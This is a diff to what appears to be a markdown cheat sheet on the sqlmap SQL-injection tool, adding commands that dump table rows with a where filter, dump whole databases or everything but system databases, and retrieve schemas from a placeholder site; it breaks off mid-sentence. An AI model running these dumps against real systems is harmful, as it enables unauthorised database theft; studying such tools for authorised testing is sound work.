@@ -95,4 +95,17 @@ We can only enumerate a specific range of rows by specifying --start and --stop:
 ```
 sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
 ```
-We can enumerate rows 
+We can enumerate rows with a where condition:
+```
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
+```
+We can dump all table from a db by using
+`--dump -D testdb`
+
+We can dump everything except sysdbs by using:
+`--dump-all --exclude-sysdbs`
+
+We can retrieve the structure of all db using the switch
+`--schema`
+
+We can search for columns, db and tables of interest by using 
